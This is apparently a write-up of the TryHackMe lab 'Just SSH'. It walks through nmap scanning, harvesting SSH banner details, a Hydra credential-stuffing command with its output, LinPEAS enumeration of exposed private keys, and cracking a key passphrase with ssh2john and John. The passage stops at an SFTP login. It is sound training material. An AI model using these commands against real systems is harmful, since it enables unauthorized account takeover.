# Just SSH Walkthrough

## Overview
**Platform**: TryHackMe  
**Box Name**: Just SSH  
**Difficulty**: Medium  
**Description**: A box made for pentesting SSH. Utilize common enumeration, exploitation, and privilege escalation techniques to compromise a vulnerable SSH service and gain root access.

---

## Recon and Enumeration (MITRE ATT&CK Outline)

| Technique ID                                        | Name                               | Tool(s) Used                     |
| --------------------------------------------------- | ---------------------------------- | -------------------------------- |
| [T1595](https://attack.mitre.org/techniques/T1595/) | Active Scanning                    | NMAP                             |
| [T1592](https://attack.mitre.org/techniques/T1592/) | Gather Victim Host Information     | ssh -v                           |
| [T1591](https://attack.mitre.org/techniques/T1591/) | Gather Victim Org Information      | ssh -v                           |
| [T1589](https://attack.mitre.org/techniques/T1589/) | Gather Victim Identity Information | Breached Creds, Personnel Roster |

---

Steps

1. Perform Active Scanning with NMAP:
```bash
sudo nmap $ip -Pn -n -oA discScan
```

<PRE>
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 00:41 EST
Nmap scan report for 10.10.43.128
Host is up (0.21s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds
</PRE>
---

2. Gather Host Information with SSH Debug Mode:
```bash
ssh -v $ip
```

<PRE>
debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
debug1: SSH2_MSG_SERVICE_ACCEPT received

**************************************************************************
*                           Nexora Solutions                             *
*                    Secure Shell (SSH) Access Portal                    *
**************************************************************************

NOTICE: This system is for authorized use only. Unauthorized access or use 
is prohibited and may result in disciplinary action and/or civil and 
criminal penalties. All activities on this system are monitored and 
recorded. 

For assistance, contact:
  support@nexora-solutions.com
  j_davis@nexora-solutions.com

debug1: Authentications that can continue: publickey,password
debug1: Will attempt key: /home/not-root/.ssh/id_rsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa 
debug1: Will attempt key: /home/not-root/.ssh/id_ecdsa_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519 
debug1: Will attempt key: /home/not-root/.ssh/id_ed25519_sk 
debug1: Will attempt key: /home/not-root/.ssh/id_xmss 

</PRE>

---

What We Know

- Open Ports: Port 22 (SSH) is open.
- SSH Service Information:
  - Protocol: SSH v2.0
  - Software Version: OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
  - Banner Information: The server is part of "Nexora Solutions."
  - Authentication Methods: Publickey and Password
  - Acceptable Keys: Several key types, including id_rsa, id_ecdsa, and others, are attempted automatically.
- Potential Naming Convention: The banner includes emails, e.g., j_davis@nexora-solutions.com suggesting a naming convention of f_last.

---

What We Have

- Personnel Roster: Names and potential user accounts.
- Breached Credentials: Password list from previous breaches.

---

What We Can Do

1. Craft a credential stuffing attack using breached credentials and the observed naming convention (f_last).

---

## Initial Access (MITRE ATT&CK Outline)

| Technique ID                                                 | Name                | Tool(s) Used |
| ------------------------------------------------------------ | ------------------- | ------------ |
| [T1078](https://attack.mitre.org/techniques/T1078/)          | Valid Accounts      | Hydra, SSH   |
| [T1110](https://attack.mitre.org/techniques/T1110/004/)T1110 | Credential Stuffing | Hydra        |

---

### Steps

1. **Crafting the Credential Stuffing Attack**

Make a `users.txt` list which reflects the naming convention found on the SSH Banner:  
Naming Convention: `f_lastName`
<details>
<summary>Example `users.txt`:</summary>
<PRE>
j_davis  
b_harris  
l_jackson  
c_thomas  
e_anderson  
d_white  
a_garcia  
j_smith  
j_moore  
m_brown  
m_martin  
s_miller  
p_martinez  
d_wilson  
e_johnson  
r_taylor  
j_thompson  
</PRE>
</details>  

With `users.txt` and the breached credentials list, initiate the credential stuffing attack:  

Command:
```bash
hydra -L users.txt -P breachedCreds.txt $ip ssh
```
  
Output:  
<PRE>
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-05 01:49:17  
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4  
[DATA] max 16 tasks per 1 server, overall 16 tasks, 119 login tries (l:17/p:7), ~8 tries per task  
[DATA] attacking ssh://10.10.43.128:22/  
[22][ssh] host: 10.10.43.128   login: j_moore   password: **********  
[22][ssh] host: 10.10.43.128   login: m_brown   password: **********  
1 of 1 target successfully completed, 2 valid passwords found  
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-05 01:50:07  
</PRE>

---

2. **Gain Initial Foothold**

Use the newly found credentials to gain access to the target and retrieve the user flag:  

Commands:  
```bash
ssh j_moore@$ip  
ssh m_brown@$ip  
```

---

## Lateral Movement (MITRE ATT&CK Outline)

| Technique ID                                            | Name                  | Tool(s) Used                    |
| ------------------------------------------------------- | --------------------- | ------------------------------- |
| [T1021](https://attack.mitre.org/techniques/T1021/004/) | Remote Services       | SSH                             |
| [T1552](https://attack.mitre.org/techniques/T1552/)     | Unsecured Credentials | Manual Enumeration / LinPEAS.sh |
| [T1110](https://attack.mitre.org/techniques/T1110/002/) | Password Cracking     | ssh2john, john/hashcat          |
| [T1110](https://attack.mitre.org/techniques/T1110/003/) | Password Spraying     | NMAP Scripting Engine           |

---

### Steps

1. **Internal Recon and Enumeration with LinPEAS**

Transfer LinPEAS to the target system and execute it using j_moore's profile:  

Command:  
```bash
bash linpeas.sh  
```
Truncated Output:
<PRE>
══╣ Possible private SSH keys were found!  
/home/j_moore/.ssh/id_rsa  
/home/sftp/uploads/.temp_keys/id_rsa_backup_script  
/home/sftp/uploads/.temp_keys/id_rsa_contractor1  
/home/sftp/uploads/.temp_keys/id_rsa_audit  

Additionally:  
-rw------- 1 sftp sftp_service 3435 Jan  3 01:56 /home/sftp/uploads/.temp_keys/id_rsa_barbara  
</PRE>

---

### What We Know

- Nexora-Solutions uses public keys to access services and accounts.  
- SSH Key Sprawl is evident, suggesting improper key management.  
- j_moore is part of the `sftp_service` group.  

---

### What We Have

- Private Keys for:
  - j_moore
  - m_brown
  - backup_script
  - contractor1
  - audit  

---

### What We Can Do

1. Test j_moore's private key against the SFTP service.  
2. Conduct an SSH Key Spray attack to identify additional access points.  

---

### j_moore, Lateral Move to SFTP

Log into the SFTP service using j_moore's id_rsa:
Command:  
```bash
sftp -i id_rsa sftp@$ip  
```
Expected Output:  
<PRE>
The authenticity of host '10.10.64.168 (10.10.64.168)' can't be established.  
ED25519 key fingerprint is SHA256:RPye4zEVR50BH+C2h4qT0zFRbYVknKzA3S/aP0fddoc.  
This key is not known by any other names  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '10.10.64.168' (ED25519) to the list of known hosts.  

**************************************************************************  
*                           Nexora Solutions                             *  
*                    Secure Shell (SSH) Access Portal                    *  
**************************************************************************  

NOTICE: This system is for authorized use only. Unauthorized access or use  
is prohibited and may result in disciplinary action and/or civil and  
criminal penalties. All activities on this system are monitored and  
recorded.  

For assistance, contact:  
  support@nexora-solutions.com  
  j_davis@nexora-solutions.com  

Enter passphrase for key 'id_rsa':  
</PRE>
---

Before logging into the SFTP service, the passphrase for the id_rsa key must be cracked.

---

#### Cracking SSH Passphrases

Step 1: Transfer j_moore's id_rsa to the attack computer.  
Step 2: Utilize ssh2john to output a hash format for John/Hashcat to crack against.  

Command:  
```bash
ssh2john id_rsa_moore > moore.hash
```

Step 3: Use John or Hashcat to crack the hash (assuming it is a weak password).  

Command:  
```bash
john moore.hash --wordlist=/usr/share/wordlists/rockyou.txt  
```

Expected Output:  
<PRE>
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes  
Cost 2 (iteration count) is 16 for all loaded hashes  
Will run 3 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
********         (id_rsa_moore)       
1g 0:00:00:08 DONE (2025-01-06 01:08) 0.1194g/s 40.14p/s 40.14c/s 40.14C/s nicholas..olivia  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.  
</PRE>

---

With the id_rsa passphrase, test j_moore's id_rsa against the SFTP service.  
Command:  
```bash
sftp -i id_rsa sftp@$ip 
```
 
Expected Output:  
<PRE>
Enter passphrase for key 'id_rsa':  
Connected to 10.10.64.168.  
sftp>  
</PRE>
